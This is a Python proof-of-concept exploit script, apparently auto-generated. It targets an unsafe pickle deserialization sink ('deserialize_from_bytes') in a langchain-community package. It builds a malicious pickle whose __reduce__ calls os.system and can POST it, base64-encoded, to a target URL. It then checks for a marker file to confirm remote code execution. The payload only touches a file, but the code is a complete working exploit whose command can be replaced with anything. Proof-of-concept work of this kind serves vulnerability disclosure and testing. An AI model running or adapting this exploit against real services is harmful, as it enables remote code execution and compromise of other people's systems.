#!/usr/bin/env python3
# PoC for langchain-community-only (/tmp/langchain-community-only)
# Path: rce-020
# Sink: deserialize_from_bytes
# Auto-generated — run with: python3 rce_function_deserialize_bytes_directly_deserialize_from_bytes_6.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept Exploit for langchain-community-only RCE
Vulnerability: Unsafe pickle.loads in deserialize_from_bytes
Target: /tmp/langchain-community-only (simulated API endpoint)

This PoC demonstrates remote code execution by sending a malicious pickle
payload to the vulnerable deserialize_from_bytes function. The payload
executes 'touch /tmp/poc_success.txt' as a benign proof of concept.

Usage:
    python3 poc.py [--target http://localhost:8000/api/v1/trigger]
"""

import argparse
import pickle
import os
import sys
import requests
import subprocess
import base64

# =============================================================================
# Step 1: Create a malicious pickle payload
# =============================================================================

class MaliciousPickle:
    """
    A class that when unpickled will execute a system command.
    The __reduce__ method tells pickle how to reconstruct this object,
    and we abuse it to run arbitrary code.
    """
    def __reduce__(self):
        # Benign command: create a marker file to prove RCE
        cmd = "touch /tmp/poc_success.txt"
        # Return (callable, args) - pickle will call os.system(cmd)
        return (os.system, (cmd,))

def create_payload() -> bytes:
    """
    Create a malicious pickle payload that executes a benign command.
    Returns the serialized bytes.
    """
    payload = pickle.dumps(MaliciousPickle())
    return payload

# =============================================================================
# Step 2: Simulate the vulnerable endpoint (for testing without a real server)
# =============================================================================

def simulate_vulnerable_endpoint(serialized_bytes: bytes):
    """
    This simulates what the vulnerable deserialize_from_bytes function does.
    In a real attack, this would be called by the server.
    We include this for local testing to verify the payload works.
    """
    # This is the exact vulnerable code from the library
    # deserialize_from_bytes calls pickle.loads directly
    print("[*] Simulating deserialize_from_bytes with malicious payload...")
    try:
        # The vulnerable call - this will execute our command
        obj = pickle.loads(serialized_bytes)
        print(f"[+] Deserialization succeeded, returned: {obj}")
    except Exception as e:
        print(f"[!] Deserialization raised: {e}")
        # Even if it raises, the command may have already executed
        # because __reduce__ runs during unpickling

# =============================================================================
# Step 3: Exploit against a real target
# =============================================================================

def exploit_remote(target_url: str, payload: bytes):
    """
    Send the malicious payload to the target API endpoint.
    The endpoint is expected to call deserialize_from_bytes with our input.
    """
    print(f"[*] Sending exploit to {target_url}")
    
    # The payload needs to be sent in a format the server expects.
    # Based on the finding, the endpoint accepts a string parameter.
    # We'll base64-encode the pickle bytes to avoid binary issues.
    payload_b64 = base64.b64encode(payload).decode('utf-8')
    
    try:
        # Send POST request with the payload as a parameter
        response = requests.post(
            target_url,
            json={"untrusted_user_input": payload_b64},
            timeout=10
        )
        print(f"[*] Server responded with status: {response.status_code}")
        print(f"[*] Response body: {response.text[:500]}")
        
        if response.status_code == 200:
            print("[+] Exploit sent successfully!")
        else:
            print("[!] Unexpected response - check if command executed anyway")
            
    except requests.exceptions.ConnectionError:
        print("[!] Connection failed - is the target server running?")
        print("[!] Try running the local simulation instead.")
    except requests.exceptions.Timeout:
        print("[!] Request timed out - server may be slow or unresponsive")
    except Exception as e:
        print(f"[!] Error during exploit: {e}")

# =============================================================================
# Step 4: Verify the exploit worked
# =============================================================================

def verify_exploit():
    """
    Check if the marker file was created, indicating successful RCE.
    """
    marker_file = "/tmp/poc_success.txt"
    if os.path.exists(marker_file):
        print(f"[+] SUCCESS! Marker file '{marker_file}' exists.")
        print("[+] Remote code execution confirmed!")
        # Clean up
        os.remove(marker_file)
        print("[*] Cleaned up marker file.")
        return True
    else:
        print("[!] Marker file not found - exploit may have failed.")
        return False

# =============================================================================
# Main execution
# =============================================================================

def main():
    parser = argparse.ArgumentParser(
        description="PoC for langchain-community-only pickle RCE"
    )
    parser.add_argument(
        "--target",
        default="http://localhost:8000/api/v1/trigger",
        help="Target URL (default: http://localhost:8000/api/v1/trigger)"
    )
    parser.add_argument(
        "--local",
        action="store_true",
        help="Run local simulation instead of attacking a remote target"
    )
    args = parser.parse_args()
    
    print("=" * 60)
    print("langchain-community-only Pickle RCE PoC")
    print("=" * 60)
    
    # Create the malicious payload
    print("[*] Creating malicious pickle payload...")
    payload = create_payload()
    print(f"[*] Payload size: {len(payload)} bytes")
    
    if args.local:
        # Local simulation
        print("\n[*] Running LOCAL simulation...")
        simulate_vulnerable_endpoint(payload)
        verify_exploit()
    else:
        # Remote exploit
        print(f"\n[*] Targeting: {args.target}")
        exploit_remote(args.target, payload)
        
        # Give the server a moment to execute
        import time
        time.sleep(1)
        
        # Check locally if we're testing against localhost
        if "localhost" in args.target or "127.0.0.1" in args.target:
            verify_exploit()
        else:
            print("[*] Remote target - check /tmp/poc_success.txt on the server")
    
    print("\n[*] PoC completed.")

if __name__ == "__main__":
    main()
